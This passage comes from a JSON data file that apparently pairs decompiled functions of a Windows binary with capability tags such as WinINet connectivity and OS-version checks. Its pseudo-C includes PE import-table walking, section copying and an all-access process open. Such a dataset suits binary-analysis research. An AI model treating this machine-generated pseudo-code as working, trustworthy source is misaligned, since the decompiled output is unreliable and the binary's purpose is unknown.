arg2_01, 6);\n                if ((iVar7 == 0) && (arg2_00 = fcn.00030c98(uVar12 + 0xe),  arg2_00 != NULL)) {\n                    *arg2_00 = auStack88;\n                    *(arg2_00 + 1) = uStack80;\n                    *(arg2_00 + 0xc) = uStack76;\n                    fcn.0006670a(arg2_00 + 0xe, arg3, uVar12);\n                    arg2_01 = arg2_00;\n                    fcn.0003350c(arg1_00, arg2_00, uVar12 + 0xe);\n                    fcn.00030d24(arg2_00);\n                }\n            }\ncode_r0x0004b1e9:\n            uVar10 = uVar11 + 1;\n            uVar11 = uVar10;\n            piVar9 = piVar9 + 0xc;\n        } while (uVar10 < 0x40);\n        (**0x113e8)(0x8c658, arg2_01 & 0xffffffffffffff00 | uVar4);\n    }\n    return;\n}\n",
        "token_count": 1387
    },
    "0004b9ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0004b9ec(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    char *pcVar3;\n    uint16_t auStack280 [8];\n    int64_t iStack264;\n    uchar auStack256 [24];\n    char acStack232 [168];\n    \n    if ((*0x8d2d0 == 0) && (cVar1 = (*_fcn.000115f8)(),  cVar1 == '\\0')) {\n        fcn.0006687e(3, 0x8d2b0);\n        *0x8d2d0 = 1;\n    }\n    if (((((arg2 != 0) && (arg2 != 1)) && (arg2 != 2)) && ((arg2 != 3 && (arg2 != 4)))) &&\n       ((arg2 != 5 && ((arg2 != 6 && (arg2 != 7)))))) {\n        fcn.00066836(auStack256, 0x15d6c);\n    }\n    iStack264 = *0xfffff78000000014 - *0x8d2c0;\n    fcn.00031b54(&iStack264, auStack280);\n    fcn.00030df4();\n    fcn.00030df4();\n    fcn.00044350(acStack232, 0x9b, 0x15ce8, auStack280[0]);\n    uVar2 = 0xffffffffffffffff;\n    pcVar3 = acStack232;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.0004cafc(1, acStack232, ~uVar2 - 1);\n    return;\n}\n",
        "token_count": 436
    },
    "0004bdbc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0004bdbc(void)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    code **ppcVar3;\n    int64_t *piVar4;\n    uint32_t uVar5;\n    int64_t *piVar6;\n    \n    if (*0x8d318 != '\\0') {\n        *0x8d318 = '\\0';\n        *0x8d2d8 = 1;\n        fcn.0002fcb8(0x8d2f8);\n        uVar2 = 0;\n        fcn.00032748(0x8d2e8, 0);\n        fcn.00032710(0x8d2e8);\n        fcn.0002fc94(0x8d2f8);\n        uVar5 = 0;\n        ppcVar3 = 0x6b678;\n        do {\n            if (*(ppcVar3 + -0x44) != 0) {\n                uVar2 = 0;\n                (**ppcVar3)(uVar5, 1);\n            }\n            uVar5 = uVar5 + 1;\n            ppcVar3 = ppcVar3 + 0xc;\n        } while (uVar5 < 4);\n        fcn.000302e8(0x8d300);\n        uVar1 = (**0x113f0)(0x8d2e0);\n        piVar6 = 0x64;\n        piVar4 = *0x8d310;\n        do {\n            if (*piVar4 != 0) {\n                fcn.00030d24(*piVar4);\n            }\n            piVar4 = piVar4 + 4;\n            piVar6 = piVar6 + -1;\n        } while (piVar6 != NULL);\n        (**0x113e8)(0x8d2e0, uVar2 & 0xffffffffffffff00 | uVar1);\n        fcn.00030d24(*0x8d310);\n        *0x8d310 = piVar6;\n    }\n    return;\n}\n",
        "token_count": 465
    },
    "0004bf94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0004bf94(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    if (*0x8d318 == '\\0') {\n        uVar1 = 0x21590006;\n    }\n    else {\n        fcn.00030310(0x8d300);\n        iVar2 = arg1 * 0x60;\n        if (*(iVar2 + 0x6b634) != 0) {\n            fcn.00030f2c();\n            if (arg2 == 0) {\n                fcn.000274d4(*(iVar2 + 0x6b630), 0);\n            }\n            *(iVar2 + 0x6b634) = 0;\n        }\n        fcn.00030378(0x8d300);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 200
    },
    "0004c028": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0004c028(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    uint32_t uVar4;\n    int32_t in_stack_00000028;\n    int64_t iStack104;\n    uint32_t uStack96;\n    ulong uStack88;\n    \n    if (*(in_stack_00000028 * 0x60 + 0x6b634) != 0) {\n        uStack96 = arg4 + arg2;\n        uStack88 = *0xfffff78000000014;\n        iVar2 = fcn.00030cc4(uStack96);\n        if (iVar2 == 0) {\n            LOCK();\n            piVar3 = in_stack_00000028 * 0x60 + 0x6b658;\n            *piVar3 = *piVar3 + 1;\n        }\n        else {\n            iStack104 = iVar2;\n            fcn.0006670a(iVar2, arg1, arg2);\n            fcn.0006670a(arg2 + iVar2, arg3, arg4);\n            uVar1 = (**0x113f0)();\n            piVar3 = ((*0x8d308 + 1) / 100) * 100;\n            uVar4 = (*0x8d308 + 1) % 100;\n            if (uVar4 == *0x8d30c) {\n                if (in_stack_00000028 == 0) {\n                    LOCK();\n                    *0x6b658 = *0x6b658 + 1;\n                }\n            }\n            else {\n                piVar3 = &iStack104;\n                fcn.0006670a(*0x8d308 * 0x20 + *0x8d310, piVar3, 0x20);\n                *0x8d308 = uVar4;\n            }\n            (**0x113e8)(0x8d2e0, piVar3 & 0xffffffffffffff00 | uVar1);\n            fcn.0002fcb8(0x8d2f8);\n        }\n    }\n    return;\n}\n",
        "token_count": 490
    },
    "0004c4b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nulong fcn.0004c4b8(ulong noname_0, ulong noname_1, ulong arg3, uint *arg4)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    uint32_t auStackX32 [2];\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint *puStack192;\n    uint auStack184 [2];\n    uint *puStack176;\n    uint uStack168;\n    uint **ppuStack160;\n    uint auStack152 [2];\n    uint *puStack144;\n    uint auStack136 [2];\n    uint uStack128;\n    uint *puStack120;\n    uint auStack112 [2];\n    uint uStack104;\n    uint *puStack96;\n    uint auStack88 [2];\n    uint uStack80;\n    uint *puStack72;\n    uint auStack64 [2];\n    uint uStack56;\n    uint *puStack48;\n    uint auStack40 [4];\n    ulong var_1h;\n    \n    bVar5 = *0x8d318 == '\\0';\n    *arg4 = 0;\n    if (bVar5) {\n        uVar2 = 0x21590006;\n    }\n    else {\n        iVar1 = fcn.0002036c(arg3, 0x58, 3, auStackX32);\n        *arg4 = 3;\n        uVar4 = -(iVar1 != 0) & auStackX32[0];\n        auStackX32[0] = uVar4;\n        fcn.0006677c(auStack184, 0, 0x20);\n        puStack176 = &uStack232;\n        auStack184[0] = 5;\n        fcn.0006677c(&uStack232, 0, 0x28);\n        uStack228 = 2;\n        uStack220 = 2;\n        uStack212 = 2;\n        uStack204 = 2;\n        uStack196 = 2;\n        puStack192 = auStack152;\n        ppuStack160 = &puStack192;\n        uStack232 = 0x2a;\n        uStack224 = 0x2b;\n        uStack216 = 0x2c;\n        uStack208 = 0x2d;\n        uStack200 = 0x2e;\n        uStack168 = 1;\n        fcn.0006677c(auStack152, 0, 0x78);\n        puStack144 = auStack136;\n        auStack152[0] = 4;\n        uStack128 = 4;\n        iVar3 = uVar4 * 0x60;\n        uStack104 = 4;\n        auStack136[0] = *(iVar3 + 0x6b648);\n        uStack80 = 4;\n        uStack56 = 4;\n        puStack120 = auStack112;\n        auStack112[0] = *(iVar3 + 0x6b650);\n        puStack96 = auStack88;\n        auStack88[0] = *(iVar3 + 0x6b658);\n        puStack72 = auStack64;\n        auStack64[0] = *(iVar3 + 0x6b660);\n        puStack48 = auStack40;\n        auStack40[0] = *(iVar3 + 0x6b668);\n        uVar2 = fcn.0002ba2c(auStack184, in_stack_00000028, in_stack_00000030);\n    }\n    return uVar2;\n}\n",
        "token_count": 884
    },
    "0004c9a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0004c9a0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    \n    if (*0x8d318 == '\\0') {\n        fcn.000302c0(0x8d300);\n        iVar1 = fcn.0002fc18(0x8d2f8);\n        if (iVar1 == 0) {\n            iVar1 = -1;\n        }\n        else {\n            *0x8d2e0 = 0;\n            *0x8d310 = fcn.00030cc4(0xc80);\n            if (*0x8d310 == 0) {\n                iVar1 = 0x21590004;\n            }\n            else {\n                fcn.0006677c(*0x8d310, 0);\n                *0x8d308 = 0;\n                *0x8d30c = 0;\n                iVar1 = fcn.0001a9b0(0x8d2e8, 0x4c184, 0);\n                if (iVar1 == 0) {\n                    *0x8d318 = '\\x01';\n                    iVar1 = 0;\n                }\n                else {\n                    *0x8d318 = '\\0';\n                    iVar1 = fcn.00030eb8();\n                }\n                uVar4 = 0;\n                piVar3 = 0x6b63c;\n                do {\n                    iVar2 = fcn.0002748c(piVar3[-1], 0);\n                    *piVar3 = iVar2;\n                    if (iVar2 == 0) {\n                        *piVar3 = -1;\n                    }\n                    iVar2 = fcn.0002748c(piVar3[1], 0);\n                    piVar3[2] = iVar2;\n                    if (iVar2 == 0) {\n                        piVar3[2] = -1;\n                    }\n                    iVar2 = fcn.0002748c(piVar3[-3], 0);\n                    if (iVar2 != 0) {\n                        (**(piVar3 + 0xd))();\n                    }\n                    uVar4 = uVar4 + 1;\n                    piVar3 = piVar3 + 0x18;\n                } while (uVar4 < 4);\n                if (iVar1 == 0) {\n                    return 0;\n                }\n            }\n            fcn.000302e8(0x8d300);\n            fcn.0002fc94(0x8d2f8);\n            fcn.00030d24(*0x8d310);\n            *0x8d310 = 0;\n        }\n    }\n    else {\n        iVar1 = 0x21590006;\n    }\n    return iVar1;\n}\n",
        "token_count": 624
    },
    "0004cafc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0004cafc(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    if (*0x8d318 != '\\0') {\n        fcn.0004c028(0, 0, arg2, arg3);\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "0004cc00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0004cc00(ulong noname_0, ulong arg2, int64_t arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *apuStackX24 [2];\n    uint auStack136 [2];\n    ulong uStack128;\n    ulong uStack120;\n    uint uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    uchar auStack88 [32];\n    int64_t iStack56;\n    \n    apuStackX24[0] = NULL;\n    if (arg3 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.000667a0(noname_0, 0, auStack88, 0x30, 0);\n        if (iVar1 == 0) {\n            uVar2 = fcn.00030564(5, apuStackX24);\n            if (uVar2 == 0) {\n                uVar2 = 0x21590005;\n                puVar3 = apuStackX24[0];\n                if (apuStackX24[0] == NULL) {\n                    return 0x21590005;\n                }\n                while ((*(puVar3 + 0x14) != iStack56 || (puVar3[1] == 0))) {\n                    if ((*puVar3 == 0) || (puVar3 = puVar3 + *puVar3,  puVar3 == NULL)) goto code_r0x0004cd0b;\n                }\n                auStack136[0] = 0x30;\n                uStack128 = 0;\n                uStack112 = 0;\n                uStack120 = 0;\n                uStack104 = 0;\n                uStack96 = 0;\n                iVar1 = fcn.000668fc(arg3, arg2, auStack136, puVar3 + 0x4a);\n                uVar2 = -(iVar1 != 0) & 0x21590008;\n            }\n        }\n        else {\n            uVar2 = 0x21590008;\n        }\ncode_r0x0004cd0b:\n        if (apuStackX24[0] != NULL) {\n            fcn.00030d24(apuStackX24[0]);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 534
    },
    "0004cd24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0004cd24(ulong noname_0, uchar *arg2)\n\n{\n    ulong uVar1;\n    int64_t aiStackX24 [2];\n    \n    uVar1 = fcn.000667a0(noname_0, 0x1a, aiStackX24, 8, 0);\n    if (uVar1 == -0x3ffffffd) {\n        *arg2 = 0;\n    }\n    else {\n        if (uVar1 != 0) {\n            return uVar1;\n        }\n        *arg2 = aiStackX24[0] != 0;\n    }\n    return 0;\n}\n",
        "token_count": 145
    },
    "0004d0f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0004d0f4(int64_t arg1)\n\n{\n    ulong *arg1_00;\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong auStackX24 [2];\n    ulong uStack168;\n    ulong uStack160;\n    ulong uStack152;\n    ulong uStack144;\n    ulong uStack136;\n    ulong *puStack128;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong *puStack96;\n    ulong uStack88;\n    int32_t aiStack72 [14];\n    \n    uStack152 = 0x48;\n    puStack128 = &uStack168;\n    puStack96 = &uStackX16;\n    arg1_00 = arg1 + 0x4b;\n    uStack168 = 0;\n    uStack160 = 0;\n    uStackX16 = 0;\n    uStackX8 = 0;\n    uStack144 = 0x10003;\n    uStack136 = 0x10;\n    uStack120 = 0;\n    uStack112 = 0x10004;\n    uStack104 = 8;\n    uStack88 = 0;\n    uVar2 = fcn.0001eeb8(arg1_00, 0x1fffff, 0, *(arg1 + 0x1b));\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    uVar1 = fcn.000305f0(*arg1_00, &uStackX8);\n    uVar2 = uVar1;\n    if (uVar1 == 0) {\n        auStackX24[0] = 0xfffffffff70f2e80;\n        uVar1 = fcn.000667be(uStackX8, 0, auStackX24);\n        uVar2 = uVar1;\n        if (uVar1 == 0) {\n            uVar1 = fcn.0001f350(uStackX8, 0, aiStack72, 0x30);\n            uVar2 = uVar1;\n            if (uVar1 == 0) {\n                if (aiStack72[0] == 1) goto code_r0x0004d253;\n                uVar2 = 0xc0000001;\n            }\n        }\n    }\n    fcn.0001f210(uStackX8, 0);\ncode_r0x0004d253:\n    fcn.000666f2(*arg1_00);\n    fcn.00030650(*arg1_00, uStackX8);\n    return uVar2;\n}\n",
        "token_count": 600
    },
    "0004d3d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0004d3d0(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    \n    iVar3 = *(arg2 + 0x3c) + arg2;\n    uVar1 = *(iVar3 + 0x38);\n    fcn.000308a4(arg1, arg2, *(iVar3 + 0x54));\n    uVar5 = 0;\n    if (*(iVar3 + 6) != 0) {\n        puVar4 = *(iVar3 + 0x14) + 0x28 + iVar3;\n        do {\n            if (*puVar4 != 0) {\n                uVar2 = puVar4[-1];\n                if (uVar2 % uVar1 != 0) {\n                    uVar2 = (uVar2 / uVar1 + 1) * uVar1;\n                }\n                fcn.000308a4(uVar2 + arg1, puVar4[1] + arg2, *puVar4);\n            }\n            uVar5 = uVar5 + 1;\n            puVar4 = puVar4 + 10;\n        } while (uVar5 < *(iVar3 + 6));\n    }\n    return 0;\n}\n",
        "token_count": 308
    },
    "0004e350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004e350(ulong arg1, uint32_t *arg2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int64_t arg3;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t arg1_00;\n    uint64_t *puVar8;\n    uint32_t *puVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    uint64_t *puVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int64_t iStackX24;\n    uint64_t uStackX32;\n    int64_t iStack120;\n    int64_t iStack96;\n    \n    iStack120 = 0;\n    uStackX32 = 0;\n    iStackX24 = 0;\n    uVar13 = 0;\n    iVar5 = 0;\n    arg3 = fcn.00030c98(0x148);\n    if (arg3 == 0) {\n        iVar2 = 0x21590004;\n    }\n    else {\n        iVar2 = fcn.0004cf30(&iStackX24, 0x10, arg1);\n        arg1_00 = iVar5;\n        if (iVar2 == 0) {\n            iVar3 = arg2[0xf] + arg2;\n            if (*(iVar3 + 0x18) == 0x10b) {\n                uVar14 = *(iVar3 + 0x80);\n                uVar4 = 0x80000000;\n                iStack120 = iVar3;\n            }\n            else {\n                uVar14 = *(iVar3 + 0x90);\n                uVar4 = 0x8000000000000000;\n            }\n            puVar9 = uVar14 + arg2;\n            uVar14 = uVar13;\n            if ((puVar9 != arg2) && (uVar14 = 0,  puVar9[3] != 0)) {\n                iStack96 = -8;\n                do {\n                    uVar14 = uVar13 + 1;\n                    uVar6 = uVar13 * 8;\n                    uVar7 = uVar14 << 3;\n                    if (uVar14 == 0) {\n                        fcn.00030d24(arg1_00);\n                        iVar5 = 0;\n                    }\n                    else {\n                        iVar5 = fcn.00030c98(uVar7);\n                        if (iVar5 == 0) {\n                            iVar2 = 0x21590004;\n                            goto code_r0x0004e6b1;\n                        }\n                        uVar11 = uVar6;\n                        if (uVar7 < uVar6) {\n                            uVar11 = uVar7;\n                        }\n                        fcn.0006670a(iVar5, arg1_00, uVar11);\n                        fcn.00030d24(arg1_00);\n                    }\n                    if (arg1 == 0) {\n                        iVar2 = fcn.00030a40(puVar9[3] + arg2, uVar6 + iVar5);\n                    }\n                    else {\n                        iVar2 = fcn.0004d868(arg1, puVar9[3] + arg2, uVar6 + iVar5);\n                    }\n                    arg1_00 = iVar5;\n                    if (iVar2 != 0) goto code_r0x0004e6b1;\n                    iStack96 = iStack96 + 8;\n                    uVar13 = uVar14;\n                    if (iStackX24 == 0) {\n                        fcn.0006670a(arg3, *(iStack96 + iVar5), 0x40);\n                    }\n                    else {\n                        iVar2 = fcn.00030c58(iStackX24, *(iStack96 + iVar5), arg3, 0x40);\n                        if (iVar2 != 0) goto code_r0x0004e6b1;\n                    }\n                    iVar3 = *(arg3 + 0x3c) + *(iStack96 + iVar5);\n                    if (iStackX24 == 0) {\n                        fcn.0006670a(arg3 + 0x40, iVar3, 0xf8);\n                    }\n                    else {\n                        iVar2 = fcn.00030c58(iStackX24, iVar3, arg3 + 0x40, 0xf8);\n                        if (iVar2 != 0) goto code_r0x0004e6b1;\n                    }\n                    if (*(arg3 + 0x58) != 0x10b) {\n                        iVar3 = *(arg3 + 0x3c) + *(iStack96 + iVar5);\n                        if (iStackX24 == 0) {\n                            fcn.0006670a(arg3 + 0x40, iVar3, 0x108);\n                        }\n                        else {\n                            iVar2 = fcn.00030c58(iStackX24, iVar3, arg3 + 0x40, 0x108);\n                            if (iVar2 != 0) goto code_r0x0004e6b1;\n                        }\n                    }\n                    puVar12 = puVar9[4] + arg2;\n                    puVar8 = puVar12;\n                    if (*puVar9 != 0) {\n                        puVar8 = *puVar9 + arg2;\n                    }\n                    if (iStack120 == 0) {\n                        uVar6 = *puVar8;\n                    }\n                    else {\n                        uVar6 = *puVar8;\n                    }\n                    while (uVar6 != 0) {\n                        uVar7 = uVar6 & 0xffff;\n                        if ((uVar4 & uVar6) == 0) {\n                            uVar7 = uVar6 + 2 + arg2;\n                        }\n                        if (arg1 == 0) {\n                            iVar2 = fcn.0004e130(*(iStack96 + iVar5), uVar7, &uStackX32);\n                        }\n                        else {\n                            iVar2 = fcn.000513c0(iStackX24, arg3 + 0x40, *(iStack96 + iVar5), arg1);\n                        }\n                        if (iVar2 != 0) goto code_r0x0004e6b1;\n                        if (iStack120 == 0) {\n                            *puVar12 = uStackX32;\n                            puVar12 = puVar12 + 1;\n                            puVar8 = puVar8 + 1;\n                            uVar6 = *puVar8;\n                        }\n                        else {\n                            *puVar12 = uStackX32;\n                            puVar12 = puVar12 + 4;\n                            puVar8 = puVar8 + 4;\n                            uVar6 = *puVar8;\n                        }\n                    }\n                    puVar1 = puVar9 + 8;\n                    puVar9 = puVar9 + 5;\n                } while (*puVar1 != 0);\n            }\n            iVar2 = 0;\n            arg1_00 = iVar5;\n            uVar13 = uVar14;\n        }\ncode_r0x0004e6b1:\n        fcn.000666f2();\n        if ((((iVar2 != 0) && (arg1_00 != 0)) && (arg1 != 0)) && (uVar13 != 0)) {\n            puVar10 = arg1_00 + -8 + uVar13 * 8;\n            do {\n                fcn.00051ffc(arg1, *puVar10);\n                puVar10 = puVar10 + -1;\n                uVar13 = uVar13 - 1;\n            } while (uVar13 != 0);\n        }\n        fcn.00030d24(arg1_00);\n        fcn.00030d24(arg3);\n    }\n    return iVar2;\n}\n",
        "token_count": 1749
    },
    "0004e71c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004e71c(ulong arg1, uint64_t arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    int64_t arg2_00;\n    uint64_t arg2_01;\n    uint64_t arg2_02;\n    uint32_t uStackX24;\n    uint uStackX28;\n    int64_t iStackX32;\n    int64_t iStack432;\n    uint32_t uStack420;\n    uchar auStack408 [8];\n    uchar auStack400 [8];\n    int32_t iStack392;\n    int32_t iStack388;\n    uint32_t uStack384;\n    int64_t iStack376;\n    int32_t iStack348;\n    int32_t iStack344;\n    uchar auStack296 [20];\n    uint32_t uStack276;\n    int64_t iStack272;\n    uchar auStack248 [16];\n    uchar auStack232 [16];\n    int64_t iStack216;\n    int64_t iStack208;\n    uint64_t uStack200;\n    int64_t iStack136;\n    int64_t iStack128;\n    \n    iStackX32 = 0;\n    if (arg3 == NULL) {\n        return 0x21590067;\n    }\n    *arg3 = 0;\n    iVar1 = fcn.0004cf30(&iStackX32, 0x438, arg1);\n    if ((iVar1 == 0) && (iVar1 = fcn.0004cd70(iStackX32, &uStackX24),  iVar1 == 0)) {\n        iVar1 = fcn.0004e2d8(iStackX32, &uStackX24);\n        if (iVar1 == 0) {\n            if (uStackX24 == '\\0') {\n                iVar1 = fcn.0004cdbc(iStackX32, CONCAT44(uStackX28, uStackX24), auStack296, 0x20);\n                if (iVar1 != 0) goto code_r0x0004eac3;\n                if (iStack272 == 0) {\n                    iVar1 = -1;\n                    goto code_r0x0004eac3;\n                }\n                iVar1 = fcn.0004cdbc(iStackX32, iStack272, auStack408, 0x40);\n                if (iVar1 != 0) goto code_r0x0004eac3;\n                do {\n                    if (iStack376 == iStack272 + 0x20) goto code_r0x0004eaa6;\n                    iVar1 = fcn.0004cdbc(iStackX32, iStack376, &iStack432, 0x10);\n                    if (iVar1 != 0) goto code_r0x0004eac3;\n                    arg2_00 = iStack376 + -0x10;\n                    iVar1 = fcn.0004cdbc(iStackX32, arg2_00, auStack248, 0x88);\n                    if (iVar1 != 0) goto code_r0x0004eac3;\n                    iStack376 = iStack432;\n                } while (uStack200 != arg2);\n                fcn.0004dacc(iStackX32, auStack248);\n                fcn.0004dacc(iStackX32, auStack232);\n                if ((iStack216 != 0) && (iStack208 != 0)) {\n                    fcn.0004dacc(iStackX32, &iStack216);\n                }\n                if ((iStack128 != 0) && (iStack136 != 0)) {\n                    fcn.0004dacc(iStackX32, &iStack136);\n                }\n                *arg3 = arg2_00;\n            }\n            else {\n                iVar1 = fcn.0004cdbc(iStackX32, CONCAT44(uStackX28, uStackX24), &iStack432, 0x10);\n                if (iVar1 != 0) goto code_r0x0004eac3;\n                arg2_02 = uStack420;\n                if (arg2_02 == 0) {\n                    iVar1 = uStack420 - 1;\n                    goto code_r0x0004eac3;\n                }\n                iVar1 = fcn.0004cdbc(iStackX32, arg2_02, auStack296, 0x24);\n                if (iVar1 != 0) goto code_r0x0004eac3;\n                do {\n                    arg2_01 = uStack276;\n                    if (arg2_01 == arg2_02 + 0x14) goto code_r0x0004eaa6;\n                    iVar1 = fcn.0004cdbc(iStackX32, arg2_01, &uStackX24, 8);\n                    if (iVar1 != 0) goto code_r0x0004eac3;\n                    iVar1 = fcn.0004cdbc(iStackX32, arg2_01 - 8, auStack408, 0x48);\n                    if (iVar1 != 0) goto code_r0x0004eac3;\n                    uStack276 = uStackX24;\n                } while (uStack384 != arg2);\n                fcn.0004dbe4(iStackX32, auStack408);\n                fcn.0004dbe4(iStackX32, auStack400);\n                if ((iStack392 != 0) && (iStack388 != 0)) {\n                    fcn.0004dbe4(iStackX32, &iStack392);\n                }\n                if ((iStack344 != 0) && (iStack348 != 0)) {\n                    fcn.0004dbe4(iStackX32, &iStack348);\n                }\n                *arg3 = arg2_01 - 8;\n            }\ncode_r0x0004eaa6:\n            iVar1 = (*arg3 != 0) - 1;\n        }\n    }\ncode_r0x0004eac3:\n    if (iStackX32 != 0) {\n        fcn.000666f2();\n    }\n    return iVar1;\n}\n",
        "token_count": 1359
    },
    "0004ff9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0004ff9c(ulong arg1, int16_t *arg2, int64_t arg3, int64_t arg4)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    uint64_t *puVar7;\n    int64_t iVar8;\n    uint64_t arg1_00;\n    char acStackX16 [8];\n    int64_t iStackX24;\n    int64_t iStackX32;\n    uint64_t *in_stack_00000028;\n    uint64_t uStack328;\n    uint64_t *puStack320;\n    int64_t iStack312;\n    int64_t iStack304;\n    uint64_t uStack296;\n    int64_t iStack288;\n    int64_t iStack280;\n    uchar auStack272 [15];\n    uint32_t uStack257;\n    uint uStack181;\n    uint64_t uStack177;\n    uint uStack169;\n    uchar auStack104 [56];\n    \n    arg1_00 = arg1;\n    puVar7 = NULL;\n    puStack320 = NULL;\n    iStack304 = 0;\n    iStack312 = 0;\n    bVar1 = false;\n    bVar2 = false;\n    uStack328 = 0;\n    iStack288 = 0;\n    bVar3 = false;\n    if (arg2 == NULL) {\n  